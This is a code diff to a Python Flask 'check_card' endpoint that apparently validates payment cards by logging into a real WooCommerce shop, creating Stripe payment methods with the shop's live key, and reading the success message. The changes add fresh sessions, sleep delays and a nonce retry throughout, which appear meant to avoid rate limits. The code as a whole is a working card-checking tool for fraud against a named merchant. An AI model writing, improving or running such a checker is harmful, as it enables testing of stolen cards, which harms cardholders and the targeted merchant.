@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify
 import requests
 from bs4 import BeautifulSoup
 import re
+import time
 
 app = Flask(__name__)
 session = requests.Session()
@@ -25,6 +26,9 @@ def check_card():
         return jsonify({"error": "Missing cc parameter"}), 400
 
     try:
+        # Initialize a new session for each request
+        local_session = requests.Session()
+        
         n, mm, yy, cvc = split(cc)         
         headers = {
             'authority': 'shop.eyepro.co.nz',
@@ -42,13 +46,21 @@ def check_card():
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
         }
 
-        response = session.get('https://shop.eyepro.co.nz/my-account/', headers=headers)   
+        # Add delay between requests
+        time.sleep(1)
+        response = local_session.get('https://shop.eyepro.co.nz/my-account/', headers=headers)   
 
         soup = BeautifulSoup(response.text, 'html.parser')
         nonce = soup.find(id="woocommerce-login-nonce") 
 
         if nonce is None:
-            return jsonify({"error": "Could not find login nonce on the page"}), 400
+            # Retry once if nonce not found
+            time.sleep(2)
+            response = local_session.get('https://shop.eyepro.co.nz/my-account/', headers=headers)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            nonce = soup.find(id="woocommerce-login-nonce")
+            if nonce is None:
+                return jsonify({"error": "Could not find login nonce on the page"}), 400
 
         headers = {
             'authority': 'shop.eyepro.co.nz',
@@ -77,7 +89,8 @@ def check_card():
             '_wp_http_referer': '/my-account/',
         }
 
-        response = session.post('https://shop.eyepro.co.nz/my-account/', headers=headers, data=data) 
+        time.sleep(1)
+        response = local_session.post('https://shop.eyepro.co.nz/my-account/', headers=headers, data=data) 
 
         headers = {
             'authority': 'shop.eyepro.co.nz',
@@ -95,7 +108,8 @@ def check_card():
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
         }
 
-        response = session.get('https://shop.eyepro.co.nz/my-account/payment-methods/', headers=headers)    
+        time.sleep(1)
+        response = local_session.get('https://shop.eyepro.co.nz/my-account/payment-methods/', headers=headers)    
 
         headers = {
             'authority': 'shop.eyepro.co.nz',
@@ -113,7 +127,8 @@ def check_card():
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
         }
 
-        response = session.get('https://shop.eyepro.co.nz/my-account/add-payment-method/', headers=headers)
+        time.sleep(1)
+        response = local_session.get('https://shop.eyepro.co.nz/my-account/add-payment-method/', headers=headers)
 
         soup2 = BeautifulSoup(response.text, 'html.parser')
 
@@ -170,7 +185,7 @@ def check_card():
             "key": "pk_live_51HXJ75BNphwjqAcqNxLniKwT9tTzm87qpBKv6OpGGj40ijQY6fxDNVTVPDtHvyaRkpI1q7DON9p3kukPjh7IjCPf00AGX8DWsR"
         }
 
-        response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+        response = local_session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         
         stripe_response = response.json()
         
@@ -214,7 +229,8 @@ def check_card():
             '_ajax_nonce': ajax_nonce,
         }
 
-        response = session.post('https://shop.eyepro.co.nz/', params=params, headers=headers, data=data)                         
+        time.sleep(1)
+        response = local_session.post('https://shop.eyepro.co.nz/', params=params, headers=headers, data=data)                         
         message = response.text.lower()
 
         if "success" in message and "succeeded" in message:
